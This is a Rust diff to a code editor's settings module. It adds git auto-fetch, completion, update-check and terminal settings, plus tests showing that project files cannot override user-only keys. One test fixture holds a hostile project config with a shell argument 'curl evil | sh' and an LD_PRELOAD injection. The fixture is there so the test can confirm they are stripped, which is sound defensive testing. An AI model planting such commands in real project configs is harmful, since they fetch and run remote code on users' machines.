@@ -165,6 +165,9 @@ pub struct GitSettings {
     pub commit_sign_off: bool,
     /// Column of the guide shown in the commit message editor (0 = none).
     pub commit_message_ruler: u32,
+    /// Fetch every remote in the background (v0.7). Off by default: nothing runs on a timer
+    /// unless opted in. User-level only (ignored in project settings).
+    pub auto_fetch: AutoFetch,
 }
 
 impl Default for GitSettings {
@@ -175,6 +178,72 @@ impl Default for GitSettings {
             confirm_discard: false,
             commit_sign_off: false,
             commit_message_ruler: 72,
+            auto_fetch: AutoFetch::Off,
+        }
+    }
+}
+
+/// `git.auto_fetch`: `"off"` (default) or a number of minutes between background fetches.
+#[derive(Debug, Clone, Copy, PartialEq, Eq, Default)]
+pub enum AutoFetch {
+    /// Never fetch on a timer.
+    #[default]
+    Off,
+    /// Fetch all remotes every this many minutes (at least 1).
+    Minutes(u32),
+}
+
+impl AutoFetch {
+    /// The interval, or `None` when off.
+    pub fn interval(self) -> Option<std::time::Duration> {
+        match self {
+            AutoFetch::Off => None,
+            AutoFetch::Minutes(m) => Some(std::time::Duration::from_secs(u64::from(m.max(1)) * 60)),
+        }
+    }
+}
+
+impl Serialize for AutoFetch {
+    fn serialize<S: serde::Serializer>(&self, s: S) -> Result<S::Ok, S::Error> {
+        match self {
+            AutoFetch::Off => s.serialize_str("off"),
+            AutoFetch::Minutes(m) => s.serialize_u32(*m),
+        }
+    }
+}
+
+impl<'de> Deserialize<'de> for AutoFetch {
+    fn deserialize<D: serde::Deserializer<'de>>(d: D) -> Result<Self, D::Error> {
+        #[derive(Deserialize)]
+        #[serde(untagged)]
+        enum Raw {
+            Minutes(i64),
+            Text(String),
+            Flag(bool),
+        }
+        match Raw::deserialize(d)? {
+            Raw::Minutes(m) if m <= 0 => Ok(AutoFetch::Off),
+            Raw::Minutes(m) => Ok(AutoFetch::Minutes(u32::try_from(m).unwrap_or(u32::MAX))),
+            Raw::Flag(false) => Ok(AutoFetch::Off),
+            Raw::Text(t) if t.eq_ignore_ascii_case("off") => Ok(AutoFetch::Off),
+            Raw::Text(t) => t
+                .trim()
+                .parse::<u32>()
+                .map(|m| {
+                    if m == 0 {
+                        AutoFetch::Off
+                    } else {
+                        AutoFetch::Minutes(m)
+                    }
+                })
+                .map_err(|_| {
+                    serde::de::Error::custom(format!(
+                        "git.auto_fetch must be \"off\" or a number of minutes, not {t:?}"
+                    ))
+                }),
+            Raw::Flag(true) => Err(serde::de::Error::custom(
+                "git.auto_fetch must be \"off\" or a number of minutes (e.g. 15)",
+            )),
         }
     }
 }
@@ -214,6 +283,63 @@ pub struct EditorSettings {
     pub trim_trailing_whitespace: bool,
     /// End files with exactly one newline when saving.
     pub ensure_final_newline: bool,
+    /// Code completion from language servers (v0.7).
+    pub completion: CompletionSettings,
+    /// Signature help from language servers (v0.7).
+    pub signature_help: SignatureHelpSettings,
+}
+
+/// Whether accepting a completion replaces only the text before the cursor or the whole word.
+#[derive(Debug, Clone, Copy, PartialEq, Eq, Serialize, Deserialize, Default)]
+#[serde(rename_all = "snake_case")]
+pub enum CompletionInsertMode {
+    /// Insert at the cursor; the text after it stays.
+    #[default]
+    Insert,
+    /// Replace the word under the cursor, including the part after the cursor.
+    Replace,
+}
+
+/// Completion options (`[editor.completion]`). Suggestions only ever come from language
+/// servers. These settings change how Lector talks to them, never which program runs.
+#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
+#[serde(default)]
+pub struct CompletionSettings {
+    /// Show completions (typing, trigger characters and Ctrl+Space).
+    pub enabled: bool,
+    /// Accept snippet syntax from servers (tab stops, placeholders). Off: servers are told
+    /// snippets are unsupported and send plain text. Read when a server starts.
+    pub snippets: bool,
+    /// "insert" or "replace" (see [`CompletionInsertMode`]).
+    pub insert_mode: CompletionInsertMode,
+    /// Enter accepts the selected suggestion (Tab always does). Off: Enter closes the list and
+    /// inserts a line break.
+    pub accept_on_enter: bool,
+}
+
+impl Default for CompletionSettings {
+    fn default() -> Self {
+        Self {
+            enabled: true,
+            snippets: false,
+            insert_mode: CompletionInsertMode::Insert,
+            accept_on_enter: true,
+        }
+    }
+}
+
+/// Signature help options (`[editor.signature_help]`).
+#[derive(Debug, Clone, PartialEq, Eq, Serialize, Deserialize)]
+#[serde(default)]
+pub struct SignatureHelpSettings {
+    /// Show the parameter popup while typing a call (and on its command).
+    pub enabled: bool,
+}
+
+impl Default for SignatureHelpSettings {
+    fn default() -> Self {
+        Self { enabled: true }
+    }
 }
 
 impl Default for EditorSettings {
@@ -228,6 +354,8 @@ impl Default for EditorSettings {
             format_on_save: false,
             trim_trailing_whitespace: false,
             ensure_final_newline: false,
+            completion: CompletionSettings::default(),
+            signature_help: SignatureHelpSettings::default(),
         }
     }
 }
@@ -444,6 +572,10 @@ pub struct Settings {
     pub agent: AgentSettings,
     /// Code hosts (v0.6, `lector-forge`).
     pub forge: ForgeSettings,
+    /// Update check (v0.7): off until the user opts in.
+    pub updates: crate::updates::UpdatesSettings,
+    /// Integrated terminal (v0.7, `lector-ui-terminal`).
+    pub terminal: crate::terminal::TerminalSettings,
 }
 
 impl Default for Settings {
@@ -480,14 +612,16 @@ impl Default for Settings {
             review: ReviewSettings::default(),
             agent: AgentSettings::default(),
             forge: ForgeSettings::default(),
+            updates: crate::updates::UpdatesSettings::default(),
+            terminal: crate::terminal::TerminalSettings::default(),
         }
     }
 }
 
 const DEFAULT_SETTINGS_TOML: &str = r#"# Lector settings. Every key is shown with its default value.
 # Edit your copy (`settings.toml` in the config dir); a project may override
-# values in `<project>/.lector/settings.toml` (except [forge], agent servers and
-# language-server commands, which only this file may set). Unknown keys only
+# values in `<project>/.lector/settings.toml` (except [forge], [updates], agent servers,
+# the terminal shell/profiles/env and language-server commands, which only this file may set). Unknown keys only
 # produce warnings.
 
 # --- Fonts ---------------------------------------------------------------
@@ -577,6 +711,9 @@ confirm_discard = false
 commit_sign_off = false
 # Guide column in the commit message editor (0 = none).
 commit_message_ruler = 72
+# Fetch all remotes in the background: "off" (default) or every N minutes, e.g. 15.
+# Only from your own settings.toml (ignored in project settings).
+auto_fetch = "off"
 
 [editor]
 # Open files read-only. Each tab can still be toggled with "Toggle Read-Only".
@@ -597,6 +734,23 @@ format_on_save = false
 trim_trailing_whitespace = false
 # End files with exactly one newline on save.
 ensure_final_newline = false
+
+[editor.completion]
+# Suggestions while typing, after trigger characters and on Ctrl+Space. They always come
+# from the language server of the file; there is no other source.
+enabled = true
+# Let servers send snippets (tab stops and placeholders). Off: plain text only. Takes
+# effect for language servers started after the change.
+snippets = false
+# "insert" keeps the text after the cursor; "replace" overwrites the rest of the word.
+insert_mode = "insert"
+# Enter accepts the selected suggestion (Tab always does). false: Enter closes the list and
+# starts a new line.
+accept_on_enter = true
+
+[editor.signature_help]
+# Show the parameter popup while typing a call.
+enabled = true
 
 [session]
 # Reopen the tabs and layout from the last session.
@@ -649,6 +803,59 @@ default_filter = "review_requested"
 # API URL overrides by host, e.g. a proxy:
 # [forge.api_urls]
 # "github.example.com" = "https://github.example.com/api/v3"
+
+[updates]
+# Check GitHub for new Lector releases: "off" (default; Lector never contacts the network by
+# itself) or "on" (at most one request per 24 hours; no personal data is sent). "Check for
+# updates now" always works. Lector only tells you; it never downloads or installs by itself.
+# Only your own settings file may set [updates].
+check = "off"
+# "stable" (default) or "preview" (also pre-releases).
+channel = "stable"
+
+[terminal]
+# The integrated terminal (View > Terminal, ctrl+`). The shell, its arguments, profiles and
+# environment can only be set here, never in a project's .lector/settings.toml.
+# Shell; unset = $SHELL (Linux/macOS) or pwsh / powershell / cmd (Windows).
+# shell = { program = "/bin/zsh", args = ["-l"] }
+# Named profiles ("New Terminal with Profile"); default_profile picks the one "New Terminal" uses.
+# [[terminal.profiles]]
+# name = "fish"
+# program = "fish"
+# args = []
+# env = { FOO = "1" }
+# default_profile = "fish"
+# Extra environment variables for every terminal.
+# [terminal.env]
+# EDITOR = "vim"
+# Font family, size (px) and line height; unset = the code font and size, line height 1.2.
+# font_family = "JetBrains Mono"
+# font_size = 13.0
+# line_height = 1.2
+# Lines of scrollback kept per terminal.
+scrollback = 10000
+# "block", "beam" or "underline".
+cursor_style = "block"
+# Blink the cursor (off when reduce motion is on).
+cursor_blink = true
+# Copy the selection to the clipboard as soon as it is made.
+copy_on_select = false
+# Linux/Windows: ctrl+c copies when text is selected (otherwise it always interrupts).
+# ctrl+shift+c always copies.
+ctrl_c_copies_selection = false
+# macOS: Option sends Meta (ESC prefix) instead of typing special characters.
+option_as_meta = false
+# Ask before pasting several lines into a program that did not enable bracketed paste.
+confirm_multiline_paste = true
+# Where "New Terminal" starts: "project" (the project root) or "active_file" (its folder).
+new_terminal_cwd = "project"
+# Report the working directory and command marks (bash, zsh, fish; nothing is written to
+# your shell configuration).
+shell_integration = true
+# Reopen terminal tabs in their last folder (fresh shells, no scrollback).
+restore = true
+# Close a terminal tab as soon as its shell exits.
+close_on_exit = false
 "#;
 
 /// A fully commented TOML file that parses to [`Settings::default`].
@@ -715,6 +922,21 @@ fn strip_user_only(layer: &mut toml::Table, file: &Path, warnings: &mut Vec<Stri
     let mut dropped = Vec::new();
     if layer.remove("forge").is_some() {
         dropped.push("[forge]".to_string());
+    }
+    if layer.remove("updates").is_some() {
+        dropped.push("[updates]".to_string());
+    }
+    if let Some(toml::Value::Table(git)) = layer.get_mut("git") {
+        if git.remove("auto_fetch").is_some() {
+            dropped.push("git.auto_fetch".to_string());
+        }
+    }
+    if let Some(toml::Value::Table(terminal)) = layer.get_mut("terminal") {
+        for key in crate::terminal::USER_ONLY_TERMINAL_KEYS {
+            if terminal.remove(*key).is_some() {
+                dropped.push(format!("terminal.{key}"));
+            }
+        }
     }
     if let Some(toml::Value::Table(agent)) = layer.get_mut("agent") {
         if agent.remove("servers").is_some() {
@@ -834,6 +1056,71 @@ mod tests {
         assert!(w.iter().any(|w| w.contains("[forge] is ignored")), "{w:?}");
     }
 
+    #[test]
+    fn auto_fetch_is_off_by_default_parses_minutes_and_is_user_only() {
+        assert_eq!(Settings::default().git.auto_fetch, AutoFetch::Off);
+        let parse = |v: &str| {
+            let text = format!("[git]\nauto_fetch = {v}\n");
+            let table: toml::Table = toml::from_str(&text).unwrap();
+            Settings::deserialize(table).map(|s| s.git.auto_fetch)
+        };
+        assert_eq!(parse("\"off\"").unwrap(), AutoFetch::Off);
+        assert_eq!(parse("15").unwrap(), AutoFetch::Minutes(15));
+        assert_eq!(parse("\"10\"").unwrap(), AutoFetch::Minutes(10));
+        assert_eq!(parse("0").unwrap(), AutoFetch::Off);
+        assert!(parse("\"often\"").is_err());
+        assert_eq!(
+            AutoFetch::Minutes(15).interval(),
+            Some(std::time::Duration::from_secs(900))
+        );
+        let dir = tempfile::tempdir().unwrap();
+        let user = dir.path().join("settings.toml");
+        std::fs::write(&user, "[git]\nauto_fetch = 5\n").unwrap();
+        let project = dir.path().join("p");
+        std::fs::create_dir_all(project.join(".lector")).unwrap();
+        std::fs::write(
+            project.join(".lector").join("settings.toml"),
+            "[git]\nauto_fetch = 1\nblame_gutter = true\n",
+        )
+        .unwrap();
+        let (s, warnings) = load_settings_from(&user, Some(&project));
+        assert_eq!(
+            s.git.auto_fetch,
+            AutoFetch::Minutes(5),
+            "project cannot change it"
+        );
+        assert!(s.git.blame_gutter);
+        assert!(warnings.iter().any(|w| w.contains("git.auto_fetch")));
+    }
+
+    #[test]
+    fn updates_settings_are_off_by_default_and_user_only() {
+        let d = Settings::default().updates;
+        assert_eq!(d.check, crate::UpdateCheck::Off);
+        assert_eq!(d.channel, crate::UpdateChannel::Stable);
+        let dir = tempfile::tempdir().unwrap();
+        let user = dir.path().join("settings.toml");
+        std::fs::write(&user, "[updates]\nchannel = \"preview\"\n").unwrap();
+        let project = dir.path().join("p");
+        std::fs::create_dir_all(project.join(".lector")).unwrap();
+        std::fs::write(
+            project.join(".lector/settings.toml"),
+            "[updates]\ncheck = \"on\"\n",
+        )
+        .unwrap();
+        let (s, w) = load_settings_from(&user, Some(&project));
+        assert_eq!(
+            s.updates.check,
+            crate::UpdateCheck::Off,
+            "a project cannot opt you in"
+        );
+        assert_eq!(s.updates.channel, crate::UpdateChannel::Preview);
+        assert!(
+            w.iter().any(|w| w.contains("[updates] is ignored")),
+            "{w:?}"
+        );
+    }
+
     /// Regression: a project's `.lector/settings.toml` could replace a language server's
     /// command (run on open) or add agent commands.
     #[test]
@@ -878,6 +1165,86 @@ mod tests {
             "{w:?}"
         );
         assert!(w.iter().any(|w| w.contains("agent.servers")), "{w:?}");
+    }
+
+    #[test]
+    fn completion_and_signature_help_settings() {
+        let d = Settings::default().editor;
+        assert!(d.completion.enabled && !d.completion.snippets && d.signature_help.enabled);
+        assert_eq!(d.completion.insert_mode, CompletionInsertMode::Insert);
+        assert!(d.completion.accept_on_enter);
+        let s: Settings = toml::from_str(
+            "[editor.completion]\nsnippets = true\ninsert_mode = \"replace\"\n\
+             [editor.signature_help]\nenabled = false\n",
+        )
+        .unwrap();
+        assert!(
+            s.editor.completion.enabled,
+            "unset keys keep their defaults"
+        );
+        assert!(s.editor.completion.snippets && !s.editor.signature_help.enabled);
+        assert_eq!(
+            s.editor.completion.insert_mode,
+            CompletionInsertMode::Replace
+        );
+        assert!(
+            toml::from_str::<Settings>("[editor.completion]\ninsert_mode = \"sideways\"\n")
+                .is_err()
+        );
+    }
+
+    #[test]
+    fn terminal_settings_parse_and_shell_is_user_only() {
+        let d = Settings::default().terminal;
+        assert_eq!(d.scrollback, 10_000);
+        assert!(d.shell_integration && d.restore && d.confirm_multiline_paste);
+        assert!(!d.copy_on_select && !d.option_as_meta && !d.ctrl_c_copies_selection);
+        assert_eq!(d.new_terminal_cwd, crate::NewTerminalCwd::Project);
+        let dir = tempfile::tempdir().unwrap();
+        let user = dir.path().join("settings.toml");
+        std::fs::write(
+            &user,
+            "[terminal]\nshell = { program = \"/bin/zsh\", args = [\"-l\"] }\n\
+             cursor_style = \"beam\"\nnew_terminal_cwd = \"active_file\"\n\
+             [[terminal.profiles]]\nname = \"fish\"\nprogram = \"fish\"\n\
+             [terminal.env]\nA = \"1\"\n",
+        )
+        .unwrap();
+        let project = dir.path().join("p");
+        std::fs::create_dir_all(project.join(".lector")).unwrap();
+        std::fs::write(
+            project.join(".lector/settings.toml"),
+            "[terminal]\nshell = { program = \"sh\", args = [\"-c\", \"curl evil | sh\"] }\n\
+             default_profile = \"evil\"\nscrollback = 500\n\
+             [[terminal.profiles]]\nname = \"evil\"\nprogram = \"sh\"\n\
+             [terminal.env]\nLD_PRELOAD = \"/tmp/x.so\"\n",
+        )
+        .unwrap();
+        let (s, w) = load_settings_from(&user, Some(&project));
+        let t = &s.terminal;
+        assert_eq!(
+            t.shell.as_ref().map(|s| s.program.as_str()),
+            Some("/bin/zsh")
+        );
+        assert_eq!(t.profiles.len(), 1);
+        assert_eq!(t.profiles[0].name, "fish");
+        assert_eq!(t.default_profile, None);
+        assert_eq!(t.env.get("A").map(String::as_str), Some("1"));
+        assert!(!t.env.contains_key("LD_PRELOAD"));
+        assert_eq!(
+            t.scrollback, 500,
+            "harmless keys still apply from the project"
+        );
+        assert_eq!(t.cursor_style, crate::TerminalCursorStyle::Beam);
+        assert_eq!(t.new_terminal_cwd, crate::NewTerminalCwd::ActiveFile);
+        for key in [
+            "terminal.shell",
+            "terminal.profiles",
+            "terminal.env",
+            "terminal.default_profile",
+        ] {
+            assert!(w.iter().any(|w| w.contains(key)), "{key}: {w:?}");
+        }
     }
 
     #[test]
